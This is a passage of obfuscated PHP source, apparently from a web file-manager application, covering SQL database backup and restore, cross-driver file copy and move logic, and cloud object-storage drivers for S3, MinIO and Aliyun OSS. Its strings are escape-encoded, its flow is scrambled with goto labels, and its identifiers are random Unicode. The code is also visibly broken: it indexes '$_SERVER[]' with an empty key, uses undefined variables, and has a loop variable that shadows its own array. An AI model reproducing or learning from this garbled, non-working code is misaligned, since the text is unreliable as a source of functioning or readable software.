$B鍈->execute("\163\150\157\167\x20\144\x61\x74\x61\142\x61\x73\x65\163\40\x6c\x69\153\x65\x20\47{$fƤ}\47"); } catch (Exception $Aւ) { } goto f; aѝ: } public function createTable($e, $CƄ = null) { $Cԙ򳣼 =& $_SERVER[]; if (!IO::exist($e)) { ActionCall($Cԙ򳣼[975], !0, 0); show_json(LNG($Cԙ򳣼[976]), !1); } $f = sqlSplit(IO::getContent($e)); foreach ($f as $bލ) { if ($CƄ) { $eЋ = stripos($bލ, $Cԙ򳣼[977]) === 0; if ($eЋ) { $CƄ->task[$Cԙ򳣼[978]] += 1; } } $this->model()->db()->execute($bލ); if ($CƄ && $eЋ) { preg_match($Cԙ򳣼[979], $bލ, $fا); $CƄ->task[$Cԙ򳣼[980]] = $fا[1]; $CƄ->update(1); } } $this->taskToCache($CƄ); } public function insertTable($dޚɗȱ, $dΐ = null) { $F =& $_SERVER[]; $a = $this->model()->db(); $b = $fۨљ ? array($fۨљ) : $a->getTables(); foreach ($dޚɗȱ as $fҷ˯) { $fۨљ = basename($fҷ˯, $F[716]); if (!in_array($fۨљ, $b)) { continue; } if ($dΐ) { $dΐ->task[$F[980]] = $fۨљ; } if (get_filesize($fҷ˯) == 0) { continue; } $Dꭺ⊐ = $this->sqlToDb($fҷ˯, $dΐ); if (!$Dꭺ⊐) { ActionCall($F[975], !0, 0); show_json(LNG($F[981]) . "\133{$fۨљ}\135", !1); } } $this->taskToCache($dΐ); } public function sqlFromDb($EБ, $fב, $E = null, $b҄Օ = null) { goto eÂʠ; b錕: $Aֶ = $aפ->getPk(); $F۽ = $aפ->getDbFields(); do { $b = $aפ->field($F۽)->order($Aֶ . $_SERVER[][983])->selectPage($ḛ, $Fΰ); $fѠ = isset($b[$_SERVER[][351]][$_SERVER[][353]]) ? $b[$_SERVER[][351]][$_SERVER[][353]] : 0; $D = !empty($b[$_SERVER[][354]]) ? $b[$_SERVER[][354]] : array(); if (!($fӝѵ = count($D))) { break; } $BŠ = array(); foreach ($D as $F΍) { if ($EБ == $_SERVER[][984] && $F΍[$_SERVER[][29]] == $_SERVER[][985]) { $c쭫 = json_decode($F΍[$_SERVER[][359]], !0); if ($c쭫[$_SERVER[][28]] == date($_SERVER[][689]) && !$c쭫[$_SERVER[][688]]) { continue; } } if ($b҄Օ) { $F΍[$_SERVER[][75]] = "\173\151\x6f\x3a{$b҄Օ}\x7d" . substr($F΍[$_SERVER[][75]], strlen("\x7b\151\157\x3a{$F΍[$_SERVER[][742]]}\x7d")); $F΍[$_SERVER[][742]] = $b҄Օ; } $BŠ[] = $_SERVER[][986] . $this->sqlEncode($F΍) . $_SERVER[][987]; } $B쭑 = "\111\116\x53\105\x52\124\40\111\x4e\124\x4f\x20\x60{$EБ}\x60\x20\50\140" . implode($_SERVER[][988], $F۽) . $_SERVER[][989]; fwrite($D̢, $B쭑 . implode($_SERVER[][990], $BŠ) . $_SERVER[][67] . PHP_EOL); $Fΰ++; $EÍ += $fӝѵ; if ($E) { $E->update($fӝѵ); } } while ($Fΰ <= $fѠ); goto fҽ; E: $Fΰ = 1; $ḛ = 500; $D̢ = fopen($fב, $_SERVER[][982]); goto b錕; fҽ: fclose($D̢); return $EÍ; goto B; eÂʠ: if ($E) { $E->task[$_SERVER[][980]] = $EБ; } $aפ = $this->model($EБ); $EÍ = 0; goto E; B: } public function sqlToDb($D, $a뱐 = null) { goto f; f: $EӃ߂ =& $_SERVER[]; $cɱ = $this->model()->db(); $B = @fopen($D, $EӃ߂[991]); goto B; dӏ: if (trim($Eﯾ)) { $Eﯾ = rtrim(trim($Eﯾ), $EӃ߂[67]); if (!$cɱ->execute($Eﯾ)) { return !1; } if ($a뱐) { $a뱐->update($fý - 1); } } return !0; goto fɝ; fˢ: $F鈯 = 500 + 1; while (!feof($B)) { if ($a뱐 && $fý != 0) { $a뱐->task[$EӃ߂[978]] += 1; } $fý++; $BĴ = trim(fgets($B)); $Eﯾ .= $EӃ߂[50] . $this->sqlDecode($BĴ, $this->type); if ($fý == $F鈯) { $Eﯾ = rtrim(trim($Eﯾ), $EӃ߂[67]); if (!$cɱ->execute($Eﯾ)) { return !1; } if ($a뱐) { $a뱐->update($fý - 1); } $Eﯾ = $EӃ߂[33]; $fý = 0; } } fclose($B); goto dӏ; B: if (!$B) { return !1; } $fý = 0; $Eﯾ = $EӃ߂[33]; goto fˢ; fɝ: } public function dropTable($Dᗪ = null) { $b´ = $this->model()->db(); $Fۍ۝ = $Dᗪ ? array($Dᗪ) : $b´->getTables(); if (!$Fۍ۝) { return; } foreach ($Fۍ۝ as $Dᗪ) { $b´->execute("\x64\x72\157\x70\x20\x74\141\142\154\x65\40\x69\x66\40\145\x78\x69\x73\164\163\40\x60{$Dᗪ}\140"); } } private function taskToCache($A = null) { $A҉ =& $_SERVER[]; if (!$A) { return; } $B͇ = array($A҉[980] => $A->task[$A҉[980]], $A҉[978] => $A->task[$A҉[978]], $A҉[992] => $A->task[$A҉[992]]); if ($B͇[$A҉[978]] == $B͇[$A҉[992]]) { $B͇[$A҉[695]] = 1; } Cache::set($A҉[993] . $A->task[$A҉[367]], $B͇); $A->end(); } private function sqlEncode($dٰ) { $Aݝә =& $_SERVER[]; $C = array(); foreach ($dٰ as $A𹇉) { if (is_array($A𹇉)) { $A𹇉 = json_encode_force($A𹇉); } $A𹇉 = addslashes($A𹇉); $A𹇉 = str_replace(array($Aݝә[994], $Aݝә[217]), array($Aݝә[995], $Aݝә[996]), $A𹇉); $C[] = str_replace($Aݝә[55], $Aݝә[997], $A𹇉); } return $Aݝә[55] . implode($Aݝә[998], $C) . $Aݝә[55]; } private function sqlDecode($c, $Dտ) { $dջٽ =& $_SERVER[]; $c = str_replace(array($dջٽ[995], $dջٽ[996]), array($dջٽ[994], $dջٽ[217]), $c); if ($Dտ == $dջٽ[9]) { $c = stripslashes($c); } return $c; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($D軷, $e퓆) { $D = self::driverMake($e퓆[0]); if (method_exists($D, $D軷)) { return @call_user_func_array(array($D, $D軷), $e퓆); } if (method_exists($D, $_SERVER[][999])) { return @call_user_func_array(array($D, $D軷), $e퓆); } else { if (method_exists(self, $D軷)) { return @call_user_func_array(array(self, $D軷), $e퓆); } else { call_user_func_array(array(parent, $D軷), $e퓆); } } } public static function init($F܂) { return self::driverMake($F܂); } public static function copy($aǗ, $eឲ, $F󝵇 = false, $aը = false) { return self::copyMove($aǗ, $eឲ, $F󝵇, $_SERVER[][492], $aը); } public static function move($A׃, $Fճ䚖, $F = false, $cҗ = false) { return self::copyMove($A׃, $Fճ䚖, $F, $_SERVER[][494], $cҗ); } public static function saveFile($B, $Cƃ, $b׷ = true) { goto C; fķ: $Aݺ = self::driverMake($Cƃ); $EƸ = !1; if ($Aݺ->pathParse[$A旣[1000]]) { $fƐ = $Aݺ->pathParse[$A旣[1000]]; $EƸ = $Aݺ; $Aݺ = self::driverMake($fƐ); } goto bŢ; A: $B只 = self::copyFile($Bӆ, $B, $Aݺ, $c, $aё[$A旣[28]], $c䚱); if ($EƸ) { $B只 = $EƸ->getPathOuter($B只); } return $B只; goto a; C: $A旣 =& $_SERVER[]; $aё = self::info($Cƃ); $Bӆ = self::driverMake($B); goto fķ; bŢ: $c = $Aݺ->pathFather($Cƃ); $c䚱 = !0; if (!$b׷ && self::driverIsSame($Bӆ, $Aݺ)) { $c䚱 = !1; } goto A; a: } private static function copyMove($Dž, $E, $Fך, $a󘿃, $F = false) { goto b惩; bʇ: $E = self::driverMake($Dž); $CǏϤ = self::driverMake($E); $Dڢܟ = $a󘿃 == $C듭[494]; goto f֚; f딾: Hook::trigger($C듭[72], $E, $Dž, $CǏϤ, $E); $e = self::driverIsSame($E, $CǏϤ); if ($e) { if ($a󘿃 == $C듭[494] && !method_exists($CǏϤ, $C듭[1001]) && trim($E, $C듭[8]) == trim($CǏϤ->pathFather($Dž), $C듭[8])) { return $CǏϤ->getPathOuter($Dž); } if (method_exists($CǏϤ, $a󘿃)) { return $CǏϤ->{$a󘿃}($Dž, $E, $Fך); } } goto D˅ʱ; f֚: $cջ = !1; if ($CǏϤ->pathParse[$C듭[1000]]) { $E = $CǏϤ->pathParse[$C듭[1000]]; $cջ = $CǏϤ; $CǏϤ = self::driverMake($E); } self::check($E, $Dž, $CǏϤ, $E); goto f딾; cޅԄӛ: if ($cջ) { $Cǹك = $cջ->getPathOuter($Cǹك); } return $Cǹك; goto eߎ; b惩: $C듭 =& $_SERVER[]; if (!$Dž || $Dž == $C듭[8] || !$E) { return !1; } ignore_timeout(); goto bʇ; D˅ʱ: $Fڥ = $E->isFile($Dž); if (!$Fڥ && $CǏϤ->getType() == $C듭[693] && $E->getType() == $C듭[102]) { $Cǹك = $CǏϤ->copyFolderFromIO($E, $Dž, $E, $Fך, $Dڢܟ, $F); } else { $Cǹك = self::copyPath($E, $Dž, $CǏϤ, $E, $Fך, $Dڢܟ, $Fڥ, $F); } if ($Cǹك && $Dڢܟ) { $E->remove($Dž); } goto cޅԄӛ; eߎ: } private static function check($A񮿰, $D׻, $Aξ, &$dȹ) { $a׈Б =& $_SERVER[]; if (self::driverIsSame($A񮿰, $Aξ) && $A񮿰->isFolder($D׻) && $A񮿰->isParentOf($D׻, $dȹ)) { show_json(LNG($a׈Б[1002]), !1); } if (!$A񮿰->exist($D׻)) { show_json(LNG($a׈Б[101]), !1); } } private static function copyPath($c׼, $fЍãƛ, $F, $dѶŪ, $a, $Eއ, $Dݚߌ, $C = false) { goto d; b߂: if ($Dݚߌ) { return self::copyFile($c׼, $fЍãƛ, $F, $dѶŪ, $B굕, $Eއ); } if ($a == REPEAT_RENAME_FOLDER) { $a = !1; } $FА = rtrim($dѶŪ, $Bڄʍ[8]) . $Bڄʍ[8] . $B굕; goto Cꕗ; Cꕗ: $f˓ຸ = $F->mkdir($F->getPath($FА)); $dѶŪ = $F->getPathInner($f˓ຸ); $EӘ = $c׼->listPath($fЍãƛ, !0); goto E; E: $bȤ˹ = array_merge($EӘ[$Bڄʍ[73]], $EӘ[$Bڄʍ[74]]); foreach ($bȤ˹ as $Aތ) { $b = $Aތ[$Bڄʍ[29]] == $Bڄʍ[167]; $fЍãƛ = $c׼->getPathInner($Aތ[$Bڄʍ[75]]); $B순җ = self::copyPath($c׼, $fЍãƛ, $F, $dѶŪ, $a, $Eއ, $b); if (!$B순җ) { write_log($Bڄʍ[1003] . $fЍãƛ . $Bڄʍ[1004] . $dѶŪ, $Bڄʍ[1005]); } } return $f˓ຸ; goto dۺɶ; d: $Bڄʍ =& $_SERVER[]; $B굕 = $C ? $C : $c׼->getPathName($c׼->pathThis($fЍãƛ)); if ($a) { $c = $F->fileNameExist($dѶŪ, $B굕); $B굕 = $F->fileNameAuto($dѶŪ, $B굕, $a, !$Dݚߌ); $a = $c ? $a : !1; } goto b߂; dۺɶ: } private static function copyFile($f߇, $f߉, $Aܳ܂т, $B, $f澳͑, $b) { goto A; AҲ: $c删 = $f߇->iconvApp($c删); $bɐ׉ = $Aܳ܂т->upload($B, $c删, $b); self::remove($c݋ . $AĪɗ); goto D; D: Hook::trigger($BؐÇ[1008], $f߇, $f߉, $Aܳ܂т, $B, $f澳͑, $bɐ׉); return $bɐ׉; goto a펽; A: $BؐÇ =& $_SERVER[]; $B = $Aܳ܂т->getPath(rtrim($B, $BؐÇ[8]) . $BؐÇ[8] . $f澳͑); $AĪɗ = $BؐÇ[1006] . time() . rand_string(5); goto eՑ; f䛋: mk_dir($c݋); $c删 = $c݋ . $AĪɗ; $c删 = $f߇->download($f߉, $c删); goto AҲ; eՑ: Hook::trigger($BؐÇ[1007], $f߇, $f߉, $Aܳ܂т, $B, $f澳͑, $AĪɗ); if (self::driverIsSame($f߇, $Aܳ܂т)) { if ($b) { $bɐ׉ = $Aܳ܂т->moveFile($f߉, $B); } else { $bɐ׉ = $Aܳ܂т->copyFile($f߉, $B); } Hook::trigger($BؐÇ[1008], $f߇, $f߉, $Aܳ܂т, $B, $f澳͑, $bɐ׉); return $bɐ׉; } $c݋ = TEMP_FILES; goto f䛋; a펽: } public static function pathFather($A䒧) { $a﵏ = IO::init($A䒧); $a = $a﵏->pathFather($a﵏->path); return $a﵏->getPathOuter($a); } public static function fileOut($d䈳, $fێʝ = false, $B = false, $Fَ = '') { $cꖂ = self::driverMake($d䈳); if ($cꖂ->isFileOutServer()) { return $cꖂ->fileOutServer($d䈳, $fێʝ, $B, $Fَ); } return $cꖂ->fileOut($d䈳, $fێʝ, $B, $Fَ); } public static function fileOutImage($D, $A = 250) { $B = array(250, 600, 1200, 3000); for ($C = 0; $C < count($B); $C++) { if ($C == 0 && $A <= $B[$C]) { $A = $B[$C]; break; } else { if ($A > $B[$C - 1] && $A <= $B[$C]) { $A = $B[$C]; break; } else { if ($C == count($B) - 1 && $A > $B[$C]) { $A = $B[$C]; break; } } } } $dуޕ = self::driverMake($D); if ($dуޕ->isFileOutServer()) { return $dуޕ->fileOutImageServer($D, $A); } return $dуޕ->fileOutImage($D, $A); } private static function driverIsSame($aϴ, $E) { goto C禖; d: if ($aϴ->pathDriver == $E->pathDriver) { return !0; } return !1; goto f߼; e⧘: if ($cڴކ != $bꆼ) { return !1; } if ($cڴކ == $d߻[693]) { return !0; } if ($cڴކ == $d߻[102]) { return !0; } goto d; C禖: $d߻ =& $_SERVER[]; $cڴކ = $aϴ->getType(); $bꆼ = $E->getType(); goto e⧘; f߼: } public static function copyUpdate($eǭ߲, $d) { goto FƮ; Aɍ: Hook::trigger($fꝰ[1012], $eǭ߲, $d, $b徃); foreach ($BҴ as $e) { IO::mkdir($e); } foreach ($e as $e) { IO::copy($e[$fꝰ[1009]], $e[$fꝰ[1010]], REPEAT_REPLACE); } goto Bϴ; FƮ: $fꝰ =& $_SERVER[]; if (!IO::exist($eǭ߲)) { return !1; } if (!IO::exist($d)) { IO::mkdir($d); } goto cÚ; cÚ: $aìʳ = self::_listAll($eǭ߲); $E = self::_listAll($d); $e = array(); goto B; B: $BҴ = array(); foreach ($aìʳ as $e𡑔 => $e) { if (isset($E[$e𡑔])) { if ($e[$fꝰ[76]] == 1) { continue; } if ($E[$e𡑔][$fꝰ[77]] == $e[$fꝰ[77]]) { continue; } } if ($e[$fꝰ[76]] == 1) { $BҴ[] = $d . $fꝰ[8] . $e𡑔; continue; } $cኯ = strstr(trim($e𡑔, $fꝰ[8]), $fꝰ[8]) ? get_path_father($e𡑔) : $fꝰ[33]; $e[] = array($fꝰ[1009] => $e[$fꝰ[75]], $fꝰ[1010] => rtrim($d, $fꝰ[8]) . $fꝰ[8] . $cኯ, $fꝰ[1011] => $e); } $b徃 = array($fꝰ[167] => $e, $fꝰ[76] => $BҴ); goto Aɍ; Bϴ: } private static function _listAll($Cև) { $Dτ =& $_SERVER[]; $Cև = KodIO::clear($Cև); $Dڹس݅ = IO::listAll($Cև); foreach ($Dڹس݅ as &$Dڇϲ) { $B = substr($Dڇϲ[$Dτ[75]], strlen($Cև)); $Dڇϲ[$Dτ[1013]] = trim($B, $Dτ[8]); } return array_to_keyvalue($Dڹس݅, $Dτ[1013]); } public static function fileSubstr($eՊމ, $F, $f稧 = false) { goto d܋; d܋: $E = self::driverMake($eՊމ); $Fۿ = $E->size($eՊމ); $fه = $F; goto d; fㄹ: return $E->fileSubstr($eՊމ, $F, $f稧); goto F뉢; eą: if ($F + $f稧 > $Fۿ) { $f稧 = $Fۿ - $F; } if ($f稧 <= 0) { return $_SERVER[][33]; } if ($F < 0 || $F >= $Fۿ || $f稧 > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\145\122\x65\141\x64\x20\145\x72\x72\157\x72\x21\40\x73\x74\141\x72\164\75{$F}\x3b\x6c\x65\156\x67\x74\x68\75{$f稧}\x3b\x20\163\151\172\145\x3d{$Fۿ}\73"); } goto fㄹ; d: $b󃣎 = $f稧; if ($F < 0) { $F = $Fۿ + $F; } if ($f稧 === !1) { $f稧 = $Fۿ - $F; } goto eą; F뉢: } private static function driverMake(&$a) { goto D; D: $EЩٟ =& $_SERVER[]; $aͱ = KodIO::parse($a); if (!self::$driverListSystem) { $c = Model($EЩٟ[702])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($c, $EЩٟ[367]); } goto Fݫ; Fݫ: if ($aͱ[$EЩٟ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aͱ[$EЩٟ[367]]]) { return !1; } $a = $aͱ[$EЩٟ[1014]]; $f보 = self::driverGet($aͱ, $a); goto Bޘ; Bޘ: return $f보; goto fڵ; fڵ: } private static function driverGet($fֶθ, &$EĄ) { goto C򊨌А; Cۖ: if (isset($a[$E[6]][$E[1026]])) { $bę->pathBase = rtrim($a[$E[6]][$E[1026]], $E[8]) . $E[8]; $EĄ = $bę->pathBase . ltrim($EĄ, $E[8]); } $EĄ = $bę->getPath($EĄ); if (isset($fֶθ[$E[1000]])) { $EĄ = $fֶθ[$E[1000]]; } goto BΊ; eʦ: switch ($fֶθ[$E[29]]) { case KodIO::KOD_IO: $a = self::$driverListSystem[$dΓ]; break; case KodIO::KOD_SOURCE: $EĄ = $dΓ . $EĄ; $a = array($E[1016] => $E[1017], $E[6] => $fֶθ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $f񑍩 = $GLOBALS[$E[1018]]; self::$driverListUser = array_to_keyvalue($f񑍩, $E[367]); } $a = self::$driverListUser[$dΓ]; break; case KodIO::KOD_SHARE_LINK: $a = array($E[1016] => $E[1019], $E[6] => $fֶθ); $b߮ = Action($E[1020])->sharePathInfo($fֶθ[$E[75]]); $EĄ = $b߮[$E[369]]; if (!$b߮[$E[369]]) { $C񨑗 = Model($E[538])->getInfo($b߮[$E[441]]); $EĄ = KodIO::clear($C񨑗[$E[1021]] . $fֶθ[$E[1014]]); $fֶθ[$E[439]] = $C񨑗; $fֶθ[$E[1000]] = $EĄ; $a = array($E[1016] => $E[1022], $E[6] => $fֶθ); } break; case KodIO::KOD_SHARE_ITEM: $a = array($E[1016] => $E[1023], $E[6] => $fֶθ); $C񨑗 = Model($E[538])->getInfo($fֶθ[$E[367]]); if ($C񨑗[$E[369]] == $E[470]) { $EĄ = KodIO::clear($C񨑗[$E[1021]] . $fֶθ[$E[1014]]); $fֶθ[$E[439]] = $C񨑗; $fֶθ[$E[1000]] = $EĄ; $a = array($E[1016] => $E[1024], $E[6] => $fֶθ); } else { if (!$EĄ) { $EĄ = $C񨑗[$E[369]]; } } break; default: $EĄ = $fֶθ[$E[75]]; $a = array($E[1016] => $E[1025]); break; } $CԚׇ = $fֶθ[$E[75]]; if (!isset(self::$driverCache[$CԚׇ])) { $Fє = strtolower($a[$E[90]]); $c = $GLOBALS[$E[6]][$E[84]][$E[752]]; $CĤώ = $E[71] . (isset($c[$Fє]) ? $c[$Fє] : ucfirst($Fє)); if (!class_exists($CĤώ)) { show_json("{$CĤώ}\x20\156\157\164\40\x65\x78\x69\163\x74\163\41", !1); } $Fڎ = isset($a[$E[6]]) ? $a[$E[6]] : !1; self::$driverCache[$CԚׇ] = new $CĤώ($Fڎ); } goto Fޭޝ; BΊ: $bę->path = $EĄ; return $bę; goto F; C򊨌А: $E =& $_SERVER[]; $Aߐ = $fֶθ[$E[1015]]; $dΓ = $fֶθ[$E[367]]; goto eʦ; Fޭޝ: $bę = self::$driverCache[$CԚׇ]; $bę->pathDriver = $Aߐ; $bę->pathBase = $E[33]; goto Cۖ; F: } } goto Eჴ䄰; eԓя: function ActionCall($C̭) { $D؇ = array_slice(func_get_args(), 1); return ActionApply($C̭, $D؇); } function ActionCallApi($eެȲ, $F = '') { goto C; Aù: $eܔ = Action($d[19])->accessToken(); $eެȲ = str_replace($d[5], $d[4], $eެȲ) . $d[20] . $eܔ . $E楠; $b = $d[16]; goto bتӄ; C: $d =& $_SERVER[ņӺ]; $E楠 = $F; if (is_array($F)) { $E楠 = $d[16]; foreach ($F as $BǇ => $c) { $c = is_array($c) ? json_encode($c) : $c; $c = is_bool($c) ? intval($c) : $c; $E楠 .= $d[17] . $BǇ . $d[18] . rawurlencode($c); } } goto Aù; F: $c֩뇥 = json_decode($b, !0); $a = is_array($c֩뇥) ? $c֩뇥 : array($d[29] => null, $d[30] => $b); if (!$c֩뇥) { echo $b; } goto eޚޱ; eޚޱ: return $a; goto BԪ۪; bتӄ: $Bׄ = phpBinCommand(); if ($Bׄ && function_exists($d[21])) { $DΖ = $Bׄ . $d[22] . BASIC_PATH . $d[23] . escapeshellarg($eެȲ); $b = shell_exec($DΖ); } if (!$b) { $A溅 = stream_context_create(array($d[24] => array($d[25] => 20, $d[26] => $d[27]))); $b = file_get_contents(APP_HOST . $d[28] . $eެȲ, !1, $A溅); } goto F; BԪ۪: } function ActionCallHook($aׅ) { goto CΨÂ; bƠݿ: $GLOBALS[$D[31]] = 1; $CÌ = ActionApply($aׅ, $Cϝ); $bܱ = ob_get_clean(); goto fӶ; CΨÂ: $D =& $_SERVER[ņӺ]; ob_start(); $Cϝ = array_slice(func_get_args(), 1); goto bƠݿ; fӶ: $CÌ = $bܱ ? json_decode($bܱ, !0) : $CÌ; $GLOBALS[$D[31]] = 0; return $CÌ; goto fԅ; fԅ: } goto D; Aݻ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ađ) { parent::__construct($ađ); $this->signatureVersion($_SERVER[][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($AŸ) { parent::__construct($AŸ); $this->signatureVersion($_SERVER[][200]); } public function fileOutLink($Dꋛ) { $Aí =& $_SERVER[]; if (substr($Dꋛ, 0, 7) == $Aí[1117]) { $Dꋛ = $Aí[1118] . substr($Dꋛ, 7); } header($Aí[156] . $Dꋛ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($eԋ) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1173]; $this->_init($eԋ); } public function _init($Bߔ) { foreach ($Bߔ as $E㩭 => $d) { if (isset($this->{$E㩭})) { $this->{$E㩭} = $d; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[][1174], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto aƑ; fǠן: $CĐ->setMaxAgeSeconds(600); $CĐ->addExposeHeader($eꑓڪ[1180]); $CĐ->addAllowedHeader($eꑓڪ[1175]); goto eچ; eچ: $Bٌ->addRule($CĐ); try { $this->client->putBucketCors($this->bucket, $Bٌ); } catch (OSS\Core\OssException $AՐ) { return !1; } return !0; goto AǗݝ; D妤: $CĐ->addAllowedMethod($eꑓڪ[1178]); $CĐ->addAllowedMethod($eꑓڪ[1179]); $CĐ->addAllowedMethod($eꑓڪ[155]); goto fǠן; aƑ: $eꑓڪ =& $_SERVER[]; $Bٌ = new OSS\Model\CorsConfig(); $CĐ = new OSS\Model\CorsRule(); goto f; f: $CĐ->addAllowedOrigin($eꑓڪ[1175]); $CĐ->addAllowedMethod($eꑓڪ[1176]); $CĐ->addAllowedMethod($eꑓڪ[1177]); goto D妤; AǗݝ: } public function getBucketCors() { goto c未; c未: $d =& $_SERVER[]; $a͓ = null; try { $a͓ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $b) { return null; } goto DԳ; Bڻд: return array($d[175] => isset($C[0]) ? $C[0] : $d[33], $d[179] => $d, $d[1181] => $f펐Ω, $d[1182] => isset($F[0]) ? $F[0] : $d[33], $d[177] => isset($dŏڈ[0]) ? $dŏڈ[0] : $d[33]); goto CὉ; DԳ: if (!$a͓ || !($Eی = $a͓->getRules())) { return null; } $C = $Eی[0]->getAllowedOrigins(); $d = $Eی[0]->getAllowedMethods(); goto cݢ; cݢ: $f펐Ω = $Eی[0]->getMaxAgeSeconds(); $F = $Eی[0]->getExposeHeaders(); $dŏڈ = $Eی[0]->getAllowedHeaders(); goto Bڻд; CὉ: } public function isBucketCors() { goto fĮܨ; b٤Ւ: $CЧ = array($d[180], $d[181], $d[182], $d[183], $d[184]); $DՏ = array_diff($CЧ, $c); return empty($DՏ); goto aі; fĮܨ: $d =& $_SERVER[]; $Dꂯ = $this->getBucketCors(); if (!$Dꂯ || !is_array($Dꂯ)) { return !1; } goto E؈; E؈: if ($Dꂯ[$d[175]] != $d[176] || $Dꂯ[$d[177]] != $d[176]) { return !1; } $c = array_map($d[178], $Dꂯ[$d[179]]); if (!is_array($c)) { $c = array(); } goto b٤Ւ; aі: } public function mkfile($bݟڝ, $c욟 = '', $dȏ = REPEAT_RENAME) { $F匦 = $this->setContent($bݟڝ, $c욟); if ($F匦 !== !1) { return $this->getPathOuter($bݟڝ); } return !1; } public function mkdir($C޼ڍ, $e̖ = REPEAT_SKIP) { if ($this->_isFolder($C޼ڍ)) { return $this->getPathOuter($C޼ڍ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($C޼ڍ)); } catch (OSS\Core\OssException $eݍ) { return !1; } return $this->getPathOuter($C޼ڍ); } private function fileList($A, $d = '', $c㦓 = 0) { goto eݭ; E: while (!0) { $e͆ = array($eᯩޒ[1183] => $d, $eᯩޒ[186] => $dю, $eᯩޒ[1184] => $c苤, $eᯩޒ[1185] => $aԸ); try { $A = $this->client->listObjects($this->bucket, $e͆); } catch (OSS\Core\OssException $C) { break; } $aԸ = $A->getNextMarker(); $A˽ = $A->getObjectList(); $f = $A->getPrefixList(); foreach ($A˽ as $fԕ˪) { if ($fԕ˪->getKey() == $dю) { continue; } $eɍ = $fԕ˪->getKey(); if ($c㦓) { $eɍ = array($eᯩޒ[28] => $eɍ, $eᯩޒ[77] => $fԕ˪->getSize(), $eᯩޒ[190] => strtotime($fԕ˪->getLastModified())); } $D[] = $eɍ; } foreach ($f as $B) { $c[] = $B->getPrefix(); } if ($aԸ === $eᯩޒ[33]) { break; } } return array($eᯩޒ[74] => $c, $eᯩޒ[73] => $D); goto bՍ꒗; C֒: $aԸ = $eᯩޒ[33]; $c苤 = 1000; $c = $D = array(); goto E; eݭ: $eᯩޒ =& $_SERVER[]; $A = trim($A, $eᯩޒ[8]); $dю = empty($A) ? $eᯩޒ[33] : $A . $eᯩޒ[8]; goto C֒; bՍ꒗: } public function copyFile($c羕, $d) { $AΙ = $this->size($c羕); if ($AΙ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $c羕, $this->bucket, $this->pathEncode($d)); } catch (OSS\Core\OssException $a傗Θ) { return !1; } return $this->getPathOuter($d); } $A٦ = $this->multiCopyObject($c羕, $d, $AΙ); return $A٦ ? $this->getPathOuter($d) : !1; } private function multiCopyObject($d, $A來, $eє) { $f䐙 =& $_SERVER[]; try { goto F; C½漦: $d = array(); foreach ($Bؐ as $d => $B𧶜Ս) { $d[] = array($f䐙[1190] => $d + 1, $f䐙[1191] => $B𧶜Ս); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($A來), $aڥ, $d); goto C; B: $Cޥ = 1024 * 1024 * 10; $a٦ = $this->client->generateMultiuploadParts($eє, $Cޥ); foreach ($a٦ as $d => $D) { $a = $Eˈ + (int) $D[$f䐙[1187]]; $eǌ = (int) $D[$f䐙[325]] + $a - 1; $CʣŶ = array($f䐙[1188] => $a, $f䐙[1189] => $eǌ); $Bؐ[] = $this->client->uploadPartCopy($this->bucket, $d, $this->bucket, $this->pathEncode($A來), $f, $aڥ, $CʣŶ); $f = $f + 1; } goto C½漦; F: $Fߪ = array(); if ($a߯ = $this->hashMd5($d)) { $Fߪ = array(OSS\OssClient::OSS_HEADERS => array($f䐙[1186] => $a߯)); } $aڥ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($A來), $Fߪ); goto AÑұ; AÑұ: $f = 1; $Eˈ = 0; $Bؐ = array(); goto B; C: } catch (OSS\Core\OssException $C۩) { return !1; } return !0; } public function moveFile($FҒ, $Cθ) { if ($this->copyFile($FҒ, $Cθ)) { $this->remove($FҒ); return $this->getPathOuter($Cθ); } return !1; } public function delFile($c) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($c)); } catch (OSS\Core\OssException $E랑) { return !1; } return !0; } public function delFolder($Dá) { $c =& $_SERVER[]; $aˈ = $this->fileList($Dá); if (!empty($Dá) && !in_array(trim($Dá, $c[8]) . $c[8], $aˈ[$c[73]])) { $aˈ[$c[73]][] = trim($Dá, $c[8]) . $c[8]; } foreach (array_chunk($aˈ[$c[73]], 1000) as $bㅃ) { try { $this->client->deleteObjects($this->bucket, $bㅃ); } catch (OSS\Core\OssException $eԅ) { continue; } } return !0; } public function rename($D, $d) { return $this->renameObject($D, $d); } private function fileInfo($c, $DĐαڣ = array()) { goto E밼; D͎: if (isset($DĐαڣ[$cߴջ[77]])) { $aĎܽ[$cߴջ[77]] = $DĐαڣ[$cߴջ[77]]; } if (isset($DĐαڣ[$cߴջ[107]])) { $aĎܽ[$cߴջ[107]] = $DĐαڣ[$cߴջ[107]]; } if (isset($DĐαڣ[$cߴջ[190]]) && !trim($aĎܽ[$cߴջ[107]])) { $aĎܽ[$cߴջ[107]] = $DĐαڣ[$cߴջ[190]]; } goto Dʋ; Dʋ: return $aĎܽ; goto eՙ; E밼: $cߴջ =& $_SERVER[]; $aĎܽ = array($cߴջ[28] => $this->pathThis($c), $cߴջ[75] => $this->getPathOuter($c), $cߴջ[29] => $cߴջ[167], $cߴջ[187] => 0, $cߴջ[107] => 0, $cߴջ[77] => 0, $cߴջ[160] => 